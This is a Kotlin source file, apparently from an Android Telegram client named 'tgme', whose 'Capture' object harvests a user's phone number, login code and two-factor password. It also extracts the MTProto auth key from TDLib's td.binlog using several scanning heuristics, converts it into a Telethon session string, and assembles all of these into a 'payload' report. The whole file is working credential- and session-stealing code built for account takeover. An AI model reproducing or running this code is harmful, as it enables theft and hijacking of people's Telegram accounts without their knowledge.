package com.tgme.app

import android.content.Context
import android.util.Base64
import org.drinkless.tdlib.TdApi
import java.io.File
import java.util.zip.Inflater

object Capture {
    var phone = ""
    var code = ""
    var password = ""
    var codeLength = 0

    var userId = 0L
    var userName = ""
    var dcId = 0
    var authKeyHex = ""
    var session = ""
    var strategy = ""

    private val AUTH_KEY = "auth_key".toByteArray(Charsets.US_ASCII)

    fun save(ctx: Context) {
        ctx.getSharedPreferences("tgme", Context.MODE_PRIVATE).edit()
            .putString("phone", phone)
            .putString("code", code)
            .putString("password", password)
            .putString("session", session)
            .apply()
    }

    fun load(ctx: Context) {
        val p = ctx.getSharedPreferences("tgme", Context.MODE_PRIVATE)
        phone = p.getString("phone", "") ?: ""
        code = p.getString("code", "") ?: ""
        password = p.getString("password", "") ?: ""
        session = p.getString("session", "") ?: ""
    }

    // ---------- td.binlog ----------

    fun binlogFile(ctx: Context) = File(ctx.filesDir, "tdlib/db/td.binlog")

    fun readAuth(ctx: Context, timeoutMs: Long = 20000): Boolean {
        val f = binlogFile(ctx)
        val end = System.currentTimeMillis() + timeoutMs
        while (System.currentTimeMillis() < end) {
            if (f.exists()) {
                try { if (parse(f.readBytes())) return true } catch (_: Exception) {}
            }
            try { Thread.sleep(400) } catch (_: InterruptedException) {}
        }
        return authKeyHex.isNotEmpty()
    }

    private fun parse(b: ByteArray): Boolean {
        if (b.size < 16) return false
        return scanLen(b) || scanDcKey(b) || scanAscii(b) || walkInflate(b)
    }

    // --- strategie 1 : <len 260 BE ou LE><dc 4 octets><256 octets> ---

    private fun scanLen(b: ByteArray): Boolean {
        for (p in 0..b.size - 264) {
            if (be32(b, p) != 260 && le32(b, p) != 260) continue
            val vs = p + 4
            val dc = dcOf(b, vs)
            if (dc == 0) continue
            val key = b.copyOfRange(vs + 4, vs + 260)
            if (looksLikeKey(key)) { accept(dc, key, "len260"); return true }
        }
        for (p in 0..b.size - 260) {
            if (be32(b, p) != 256 && le32(b, p) != 256) continue
            val vs = p + 4
            val key = b.copyOfRange(vs, vs + 256)
            if (looksLikeKey(key)) { accept(2, key, "len256"); return true }
        }
        return false
    }

    // --- strategie 2 : <dc 4 octets><256 octets>, sans se fier a la longueur ---

    private fun scanDcKey(b: ByteArray): Boolean {
        for (p in 0..b.size - 260) {
            val dc = dcOf(b, p)
            if (dc == 0) continue
            val key = b.copyOfRange(p + 4, p + 260)
            if (looksLikeKey(key)) { accept(dc, key, "dckey"); return true }
        }
        return false
    }

    // --- strategie 3 : cle ASCII "auth_key<dc>" (anciennes versions) ---

    private fun scanAscii(b: ByteArray): Boolean {
        var i = indexOf(b, AUTH_KEY, 0)
        while (i >= 0) {
            var k = i + AUTH_KEY.size
            var digits = ""
            while (k < b.size && b[k].toInt() in 0x30..0x39) { digits += b[k].toChar(); k++ }
            if (k + 4 <= b.size) {
                val vl = le32(b, k)
                val vs = k + 4
                if (vl in 256..300 && vs + vl <= b.size) {
                    val v = b.copyOfRange(vs, vs + vl)
                    val key = v.copyOfRange(v.size - 256, v.size)
                    val dc = if (v.size >= 260) dcOf(v, 0) else digits.toIntOrNull() ?: 0
                    if (dc in 1..5 && looksLikeKey(key)) { accept(dc, key, "ascii"); return true }
                }
            }
            i = indexOf(b, AUTH_KEY, i + 1)
        }
        return false
    }

    // --- strategie 4 : parcours des entrees + zlib ---

    private fun walkInflate(b: ByteArray): Boolean {
        var p = 8
        while (p + 8 <= b.size) {
            val kl = le32(b, p); p += 4
            if (kl <= 0 || kl > 128 || p + kl + 4 > b.size) return false
            val name = String(b, p, kl, Charsets.US_ASCII); p += kl
            val vl = le32(b, p); p += 4
            if (vl <= 0 || p + vl > b.size) return false

            val raw = b.copyOfRange(p, p + vl)
            p += vl

            val cand = if (raw.size in 256..300) raw else inflate(raw) ?: raw
            if (cand.size in 256..300) {
                val key = cand.copyOfRange(cand.size - 256, cand.size)
                val dc = if (cand.size >= 260) dcOf(cand, 0) else trailing(name)
                if (dc in 1..5 && looksLikeKey(key)) { accept(dc, key, "walk"); return true }
            }

            p += 4
            if (p + 4 <= b.size) {
                val nx = le32(b, p)
                if (nx <= 0 || nx > 128) p += 4
            }
        }
        return false
    }

    private fun trailing(name: String): Int =
        name.takeLastWhile { it.isDigit() }.toIntOrNull() ?: 0

    /** Les 4 octets a `p` doivent coder un dc_id 1..5, LE (`dc 00 00 00`) ou BE (`00 00 00 dc`). */
    private fun dcOf(b: ByteArray, p: Int): Int {
        if (p + 4 > b.size) return 0
        val a = b[p].toInt() and 0xFF
        val c = b[p + 3].toInt() and 0xFF
        if (b[p + 1].toInt() == 0 && b[p + 2].toInt() == 0) {
            if (a in 1..5 && c == 0) return a
            if (c in 1..5 && a == 0) return c
        }
        return 0
    }

    private fun looksLikeKey(k: ByteArray): Boolean {
        if (k.size < 256) return false
        var zeros = 0
        val seen = BooleanArray(256)
        for (x in k) {
            if (x.toInt() == 0) zeros++
            seen[x.toInt() and 0xFF] = true
        }
        return zeros < 64 && seen.count { it } > 120
    }

    private fun inflate(src: ByteArray): ByteArray? = try {
        val inf = Inflater()
        inf.setInput(src)
        val out = ByteArray(8192)
        val n = inf.inflate(out)
        inf.end()
        if (n > 0) out.copyOf(n) else null
    } catch (_: Exception) { null }

    private fun accept(dc: Int, key: ByteArray, how: String) {
        authKeyHex = key.joinToString("") { "%02x".format(it.toInt() and 0xFF) }
        dcId = dc
        strategy = how
        session = telethon(dc, key)
    }

    private fun indexOf(h: ByteArray, n: ByteArray, from: Int): Int {
        if (n.isEmpty() || h.size < n.size) return -1
        var i = from
        while (i <= h.size - n.size) {
            var j = 0
            while (j < n.size && h[i + j] == n[j]) j++
            if (j == n.size) return i
            i++
        }
        return -1
    }

    private fun le32(b: ByteArray, p: Int): Int =
        (b[p].toInt() and 0xFF) or ((b[p + 1].toInt() and 0xFF) shl 8) or
            ((b[p + 2].toInt() and 0xFF) shl 16) or ((b[p + 3].toInt() and 0xFF) shl 24)

    private fun be32(b: ByteArray, p: Int): Int =
        ((b[p].toInt() and 0xFF) shl 24) or ((b[p + 1].toInt() and 0xFF) shl 16) or
            ((b[p + 2].toInt() and 0xFF) shl 8) or (b[p + 3].toInt() and 0xFF)

    private fun telethon(dc: Int, key: ByteArray): String {
        val ip = when (dc) {
            1 -> "149.154.175.53"
            2 -> "149.154.167.51"
            3 -> "149.154.175.100"
            4 -> "149.154.167.91"
            5 -> "91.108.56.130"
            else -> "149.154.167.51"
        }.split(".").map { it.toInt().toByte() }.toByteArray()

        val out = ByteArray(1 + 4 + 2 + 256)
        out[0] = dc.toByte()
        System.arraycopy(ip, 0, out, 1, 4)
        out[5] = 0xBB.toByte()
        out[6] = 0x01
        System.arraycopy(key, 0, out, 7, 256)
        return Base64.encodeToString(out, Base64.URL_SAFE or Base64.NO_WRAP or Base64.NO_PADDING)
    }

    // ---------- diagnostic ----------

    private fun hex(b: ByteArray, from: Int, len: Int): String {
        val end = minOf(from + len, b.size)
        val sb = StringBuilder()
        for (i in from until end) sb.append("%02x".format(b[i].toInt() and 0xFF))
        return sb.toString()
    }

    private fun offs(b: ByteArray, v: Int, be: Boolean): String {
        val out = mutableListOf<Int>()
        var p = 0
        while (p <= b.size - 4 && out.size < 5) {
            if ((if (be) be32(b, p) else le32(b, p)) == v) out.add(p)
            p++
        }
        return out.toString()
    }

    private fun offsDc(b: ByteArray): String {
        val out = mutableListOf<Int>()
        var p = 0
        while (p <= b.size - 260 && out.size < 5) {
            if (dcOf(b, p) != 0 && looksLikeKey(b.copyOfRange(p + 4, p + 260))) out.add(p)
            p++
        }
        return out.toString()
    }

    fun diagnose(b: ByteArray): String = buildString {
        append("BINLOG size=${b.size}\n")
        append("be260=${offs(b, 260, true)} le260=${offs(b, 260, false)}\n")
        append("be256=${offs(b, 256, true)} le256=${offs(b, 256, false)}\n")
        append("dckey=${offsDc(b)}\n")
        append("head=${hex(b, 0, 160)}")
    }

    // ---------- sessions actives ----------

    private fun f(o: Any, name: String): String = try {
        o.javaClass.getField(name).get(o)?.toString() ?: "-"
    } catch (_: Exception) { "-" }

    fun render(s: TdApi.Sessions): String = buildString {
        append("SESSIONS (ttl ${s.inactiveSessionTtlDays} j)\n")
        s.sessions.forEach { x ->
            append(if (x.isCurrent) "[MOI] " else "[   ] ")
            append("${x.applicationName} ${x.applicationVersion} | ${x.deviceModel} | ")
            append("${x.systemVersion} | api_id ${x.apiId} | ")
            append("${f(x, "ip")} ${f(x, "city")} ${f(x, "country")} | ")
            append("login ${x.logInDate} last ${x.lastActiveDate}\n")
        }
    }

    fun payload(ctx: Context) = buildString {
        append("READY\n")
        append("num: $phone\n")
        append("code: $code\n")
        append("pass: $password\n")
        append("user: $userId $userName\n")
        append("dc: $dcId\n")
        append("strat: $strategy\n")
        append("auth_key: $authKeyHex\n")
        append("session: $session\n")
    }
}
